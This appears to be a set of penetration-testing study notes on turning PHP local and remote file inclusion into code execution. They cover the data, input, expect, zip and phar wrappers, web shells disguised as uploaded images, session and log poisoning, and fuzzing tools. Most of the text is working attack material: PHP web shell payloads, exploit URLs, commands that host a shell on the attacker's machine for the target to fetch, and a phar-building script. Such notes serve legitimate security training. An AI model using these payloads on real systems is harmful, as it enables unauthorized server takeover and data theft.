# PHP Wrappers

## Data
The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to include external data, including PHP code..
This wrapper is only available to use if the `allow_url_include` setting is enabled in the PHP configuration.
#### Checking PHP Configurations

We can the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache, or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is the installed PHP version.

**Example Scenario:**

We find an app vulnerable to LFI, we try to read the `php.ini` file to check if `allow_url_include` is on:

```sh
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

Then take the returned Base64 encoded content and decode it, search for `allow_url_include` value:

```sh
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

#### Remote Code Execution

With `allow_url_include` enabled, we can proceed with `data` wrapper to include external data, including PHP code.

**Example Scenario:**

```sh
echo '<?php system($_GET["cmd"]); ?>' | base64 PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Now we can *URL-encode* the base64 string and pass it with the `data://text/plain;base64,` data wrapper which has the ability to decode and execute the PHP code

```sh
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```


---

## Input

Similar to the `data` wrapper, the [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code. The difference between it and the `data` wrapper is that we pass our input in the `input` wrapper as a POST request's data.

So, the vulnerable parameter must accept POST requests for this attack to work.

*Note:* This wrapper also depends on `allow_url_include`

**Example:**

```sh
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```


---

## Expect

The [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper allows us to directly run commands through URL streams. `Expect` works very similarly to web shells, but don't need to provide web shells, as it is designed to execute commands.

One caveat is that `expect` is an external wrapper and it needs to be installed and enabled manually on the back-end server. We can check the configuration to check if it's loaded or not on the webserver just like we did to with `allow_url_include`.

```sh
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid
```

# Remote File Inclusion (RFI)

If vulnerable function allows to include remote URLs. This allows two main benefits:
1. Enumerating local-only ports and web applications (SSRF)
2. Gaining remote code execution by including a malicious script that we host

The following functions that (if vulnerable) would allow RFI:

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |        ✅         |      ✅      |       ✅        |
| `file_get_contents()`        |        ✅         |      ❌      |       ✅        |
| **Java**                     |                  |             |                |
| `import`                     |        ✅         |      ✅      |       ✅        |
| **.NET**                     |                  |             |                |
| `@Html.RemotePartial()`      |        ✅         |      ❌      |       ✅        |
| `include`                    |        ✅         |      ✅      |       ✅        |

```ad-info
Almost any RFI vulnerability is also and LFI vulnerability. Howerver, an LFI may not necessarily be an RFI.
```

## Verify RFI

This also requires checking if `allow_url_include` is enabled or not.

The best way to make sure if an LFI is vulnerable to RFI is to **try to include a URL**

```sh
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

```ad-danger
It may not be ideal to include the vulnerable page itself (i.e. index.php) as this may cause recursive inclusion loops and cause a DoS to the back-end server
```

## Remote Code Execution with RFI

Start by creating a PHP shell

```sh
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Host it via any of the following methods:
## HTTP

```sh
sudo python3 -m http.server <LISTENING_PORT>
```

## FTP

```sh
sudo python -m pyftpdlib -p 21
```

## SMB

```sh
impacket-smbserver -smb2support share $(pwd)
```

**Example Payload:**

```sh
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

# LFI and File Uploads

**What if the file upload function has code execution capabilities?** We can inject a PHP web shell code within the image instead of image data.

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |        ✅         |      ✅      |       ✅        |
| `require()`/`require_once()` |        ✅         |      ✅      |       ❌        |
| **NodeJS**                   |                  |             |                |
| `res.render()`               |        ✅         |      ✅      |       ❌        |
| **Java**                     |                  |             |                |
| `import`                     |        ✅         |      ✅      |       ✅        |
| **.NET**                     |                  |             |                |
| `include`                    |        ✅         |      ✅      |       ✅        |
## Image upload
#### Crafting Malicious Image

Our first step is to create a malicious image containing a PHP web shell that still looks and works as an image (extension & magic number).

```sh
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

#### Uploaded File Path

After we upload the image, we have to find what path is used to store the image. In most cases, especially with images, we would get access to our uploaded image and can get its path from its URL.

```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

```ad-note
As we can see, we can use `/profile_images/shell.gif` as our path. If we don't know where the file is uploaded then we can fuzz for an uploads directory, and then fuzz for our uploaded file. This might not always work as some applications properly hide the uploaded files.
```

```sh
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

## Zip Upload

We can utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code. Important note that this wrapper isn't enabled by default.

We start by creating a web shell script and zipping it into an archive called `shell.jpg`

```sh
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

```ad-note
Even though our zip archive is named as a `.jpg`, some upload forms may still detect our file as a zip archive through content-type tests and disallow its upload.
```

Once we upload the `shell.jpg` archive, we can include it with the `zip` wrapper as (`zip://shell.jpg`) and then refer to any files within it with `#shell.php` (URL Encoded)

```sh
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

## Phar Upload

We can use the `phar://` wrapper to achieve similar results. To do so, we'll first write the following PHP script into a `shell.php` file:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

This script can be compiled into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with.

We can compile it into a `phar` file and rename it to `shell.jpg` as follows:

```php
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Now, we should have a `phar` file called `shell.jpg`. Once we upload it to the web application, we can simply call it with the `phar://` and provide its URL path, and specify the sub-file with `/shell.txt` (URL Encoded).

```sh
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

```ad-resources
There is another (obsolete) LFI/uploads attack worth noting, which occurs if file uploads is enabled in the PHP configurations and the `phpinfo()` page is somehow exposed to us. However, this attack is not very common, as it has very specific requirements for it to work (LFI + uploads enabled + old PHP + exposed phpinfo()). If you are interested in knowing more about it, you can refer to [This Link](https://hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html).
```

# Log Poisoning

In this attack we will write PHP code in a field we control that gets logged into a log file (i.e. `poison`/`contaminate` the log file), and then include that log file to execute the PHP code.

For this attack to work, the PHP web application should have **read privileges** over the logged files.
## PHP Session Poisoning

Most PHP web applications utilize `PHPSESSID`, which can hold specific user-related data on the back-end, so the web app keeps track of user details through their cookies.

These details are stored in `session` files on the back-end, usually saved in:
- **Linux:** `/var/lib/php/sessions/`
- **Windows:** `C:\Windows\Temp\`

After you find your session file (stored in one of the paths above, e.g. `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`), poison your session by including  a web shell payload in the controllable parameter, such as:

```sh
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

When the server processes the request, it saves the PHP code string into your session file, **poisoning** it.

Then we execute the Poisoned File using the LFI vulnerability:

```sh
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

```ad-important
To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten after our last inclusion. Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell.
```

## Server Log Poisoning

Nginx logs are readable by low privileged users by default (e.g. `www-data`), while the Apache logs are only readable by users with high privileges (e.g. `root`/`adm`).

By default, `Apache` logs are located in `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows, while `Nginx` logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows.

If we tried including the Apache access log, we'll get the following:

![[Apache Access Log Inclusion.png]]

The log contains our `User-Agent` header, we should poison this value.

There are other similar log poisoning techniques that we may utilize on various system logs, depending on which log we have read access over:

- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`

# Automated Scanning

## Fuzzing Parameters

Use wordlists such as: [HackTricks Top 25 Parameters](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters)

## LFI wordlists

A good wordlist to use is [SecLists/LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)
As it contains various bypasses and common files.

## Fuzzing Server Files
#### Server Webroot

We may need to know the full server webroot path to complete our exploitation in some cases.

To do so, we can fuzz for the `index.php` file through common webroot paths, which we can find in this [wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or this [wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt).

**Example Usage:**

```sh
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```

We may also use the same [SecLists/LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) from earlier.
#### Server Logs/Configurations

We need to identify the correct logs directory to be able to perform the log poisoning attacks.

## LFI Tools

The most common LFI tools are [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), and [liffy](https://github.com/mzfr/liffy).

